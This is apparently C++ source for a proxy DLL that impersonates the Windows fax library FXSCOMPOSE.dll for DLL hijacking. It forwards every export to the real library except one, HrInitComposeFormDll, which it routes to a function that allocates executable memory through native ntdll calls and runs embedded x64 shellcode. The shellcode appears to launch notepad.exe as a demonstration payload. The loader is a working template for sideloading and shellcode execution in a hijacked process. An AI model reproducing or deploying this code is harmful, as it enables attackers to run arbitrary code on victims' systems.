#include "pch.h"
#include <winternl.h>
#include <ntstatus.h>

// ensure every function call except our target is forwarded for functionality
#pragma comment(linker,"/export:DllMain=C:\Windows\SYSTEM32\FXSCOMPOSE.DllMain,@15")
#pragma comment(linker,"/export:FaxComposeFreeBuffer=C:\Windows\SYSTEM32\FXSCOMPOSE.FaxComposeFreeBuffer,@1")
#pragma comment(linker,"/export:HrAddressBookPreTranslateAccelerator=C:\Windows\SYSTEM32\FXSCOMPOSE.HrAddressBookPreTranslateAccelerator,@2")
#pragma comment(linker,"/export:HrDeInitAddressBook=C:\Windows\SYSTEM32\FXSCOMPOSE.HrDeInitAddressBook,@3")
#pragma comment(linker,"/export:HrDeinitComposeFormDll=C:\Windows\SYSTEM32\FXSCOMPOSE.HrDeinitComposeFormDll,@4")
#pragma comment(linker,"/export:HrFaxComposePreTranslateAccelerator=C:\Windows\SYSTEM32\FXSCOMPOSE.HrFaxComposePreTranslateAccelerator,@5")
#pragma comment(linker,"/export:HrFreeDraftsListViewInfo=C:\Windows\SYSTEM32\FXSCOMPOSE.HrFreeDraftsListViewInfo,@6")
#pragma comment(linker,"/export:HrGetDraftsListViewInfo=C:\Windows\SYSTEM32\FXSCOMPOSE.HrGetDraftsListViewInfo,@7")
#pragma comment(linker,"/export:HrInitAddressBook=C:\Windows\SYSTEM32\FXSCOMPOSE.HrInitAddressBook,@8")
//#pragma comment(linker,"/export:HrInitComposeFormDll=C:\Windows\SYSTEM32\FXSCOMPOSE.HrInitComposeFormDll,@9")
#pragma comment(linker,"/export:HrInvokeAddressBook=C:\Windows\SYSTEM32\FXSCOMPOSE.HrInvokeAddressBook,@10")
#pragma comment(linker,"/export:HrNewFaxComposeUI=C:\Windows\SYSTEM32\FXSCOMPOSE.HrNewFaxComposeUI,@11")
#pragma comment(linker,"/export:HrNewFaxComposeUIFromFile=C:\Windows\SYSTEM32\FXSCOMPOSE.HrNewFaxComposeUIFromFile,@12")
#pragma comment(linker,"/export:HrNewTiffViewUIFromFile=C:\Windows\SYSTEM32\FXSCOMPOSE.HrNewTiffViewUIFromFile,@13")
#pragma comment(linker,"/export:HrSelectEmailRecipient=C:\Windows\SYSTEM32\FXSCOMPOSE.HrSelectEmailRecipient,@14")

typedef DWORD(*HrInitComposeFormDll_Type)(void);

typedef NTSTATUS (NTAPI* LPfnNtAllocateVirtualMemory)
(
    HANDLE           ProcessHandle,   
    PVOID*           BaseAddress,     
    ULONG_PTR        ZeroBits,         
    PSIZE_T          RegionSize,       
    ULONG            AllocationType,   
    ULONG            Protect           
);

typedef NTSTATUS (NTAPI* LPfnNtWriteVirtualMemory)
(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

DWORD proxyfunc(void) 
{

    unsigned char shellcode[] = 
    {   "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00" 
    };

    SIZE_T shellcode_len = sizeof(shellcode); // compile time length

    LPVOID buf; // payload buffer
    HANDLE pHandle; // process handle
    SIZE_T bytesWritten;

    // get current process handle
    pHandle = GetCurrentProcess();

    // get function addresses for needed NTAPI, could probably put this in a struct one day
    LPfnNtAllocateVirtualMemory NtAllocateVirtualMemoryFunction = (LPfnNtAllocateVirtualMemory)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtAllocateVirtualMemory");
    LPfnNtWriteVirtualMemory NtWriteVirtualMemoryFunction = (LPfnNtWriteVirtualMemory)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtWriteVirtualMemory");

    // allocate memory and set rwx access, probably use an API call more OPSEC friendly
    NTSTATUS status = NtAllocateVirtualMemoryFunction
    (
        pHandle,
        &buf,
        0,
        &shellcode_len,
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );

    // write shellcode to the allocated memory
    if (NT_SUCCESS(status))
    {
        status = NtWriteVirtualMemoryFunction
        (
            pHandle,
            buf,
            shellcode,
            shellcode_len,
            &bytesWritten
        );
    }

    // execute shellcode
    ((void(*)())buf)();

    return 0;

    // load original DLL and get function pointer
    HMODULE hModule = LoadLibrary(L"C:\\Windows\\System32\\FxsCompose.dll");
    HrInitComposeFormDll_Type Original_HrInitComposeFormDll = (HrInitComposeFormDll_Type)GetProcAddress(hModule, "HrInitComposeFormDll");

    // call original function, again for functionality of the process you're injected into
    DWORD result = Original_HrInitComposeFormDll();

    return result;
}

BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

